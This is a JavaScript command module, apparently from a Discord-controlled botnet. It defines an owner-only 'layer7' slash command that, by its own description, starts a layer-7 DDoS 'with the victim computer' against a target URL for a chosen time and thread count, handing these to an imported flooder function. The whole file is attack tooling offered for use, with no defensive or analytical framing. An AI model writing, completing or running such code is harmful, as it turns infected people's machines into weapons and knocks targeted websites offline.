const { ApplicationCommandOptionType } = require("discord.js"),
  { OwnThread } = require("../../modules/Flooder");

module.exports = {
  name: "layer7",
  ownerOnly: true,
  description: "Start DDoS L7 with the victim computer",
  options: [
    {
      name: "target",
      description: "The Target URL",
      required: true,
      type: ApplicationCommandOptionType.String,
    },
    {
      name: "time",
      description: "Time of the flood",
      required: true,
      type: ApplicationCommandOptionType.Number,
    },
    {
      name: "threads",
      description: "Number of Flood Thread",
      required: true,
      type: ApplicationCommandOptionType.Number,
    },
  ],
  run: async (client, interaction, args) => {
    const target = interaction.options.getString("target");
    const time = interaction.options.getNumber("time");
    const threads = interaction.options.getNumber("threads");
    OwnThread(target, time, threads)
  },
};
